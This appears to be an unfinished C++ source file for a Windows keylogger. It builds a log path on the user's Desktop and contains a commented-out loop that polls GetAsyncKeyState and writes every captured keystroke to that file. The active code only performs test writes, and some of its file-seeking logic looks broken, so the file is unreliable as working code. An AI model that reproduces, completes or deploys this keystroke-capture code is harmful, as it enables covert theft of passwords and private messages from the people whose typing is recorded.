#include <iostream>
#include <fstream>
#include <limits>
#include <windows.h>
#include <Lmcons.h>
#include <stdlib.h>
#include <string>

const int LINELENGTH = 10;

struct KeyInfo
{
	boolean specialClick = false;
	boolean ctrlClick = false;
	boolean shiftClick = false;
	int keyCount = 0;
	int currentLine = 0;
};


std::string getFilePath()
{
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username, &size);

	std::string strtmp(&username[0], &username[(int)size-1]);

	std::string path = "C:\\Users\\" + strtmp + "\\Desktop\\keylogging.txt";

    return path;
}

KeyInfo clickedSpecialKey(std::string path, int key, std::fstream& logFile, KeyInfo keyInfo) 
{
	if (key == VK_BACK)
	{
		std::cout << keyInfo.keyCount - 1;
		logFile.seekp(keyInfo.keyCount - 1);
		std::cout << logFile.tellp();
		logFile.write("", 1);
		keyInfo.specialClick = true;
		keyInfo.keyCount = keyInfo.keyCount - 1;
		return keyInfo;
	}
	else if (key == VK_CAPITAL)
	{
		keyInfo.specialClick = true;
		return keyInfo;
	}
	return keyInfo;
}

void goToLine(std::fstream& logFile, int line) 
{
	logFile.seekg(std::ios::beg);
	for (int i = 1; i < line; ++i) 
	{
		logFile << "Line " << i;
		logFile.ignore(1000, '\n');
	}
}

int main()
{
    std::string path = getFilePath();
    std::fstream logFile;

	char keyPress = 'x';
	KeyInfo keyInfo;

	logFile.open(path);
	keyInfo.currentLine = std::count(std::istreambuf_iterator<char>(logFile),std::istreambuf_iterator<char>(), '\n') + 1;
	std::cout << keyInfo.currentLine;
	logFile << "\n";
	logFile << "New Line!";
	logFile.close();

	logFile.open(path);
	goToLine(logFile, keyInfo.currentLine);
	logFile.write("Worked", 6);
	logFile.close();

	/*
	while (true) {
		Sleep(10);
		for (int keyPress = 8; keyPress <= 190; keyPress++)
		{
			if (GetAsyncKeyState(keyPress) == -32767)
			{
				logFile.open(path);
				goToLine(logFile, keyInfo.currentLine);
				logFile.seekp(keyInfo.keyCount);


				keyInfo = clickedSpecialKey(path, keyPress, logFile, keyInfo);

				if (keyInfo.specialClick == false)
				{
					std::string s = "";
					s += char(keyPress);
					std::cout << s;
					logFile.write(s.c_str(), 1);
					keyInfo.keyCount++;

				}
				if (keyInfo.keyCount >= LINELENGTH)
				{
					logFile << '\n';
					keyInfo.keyCount = 0;
					keyInfo.currentLine++;
				}
				keyInfo.specialClick = false;
				logFile.close();
			}
		}
	}
	*/

    return 0; 
}

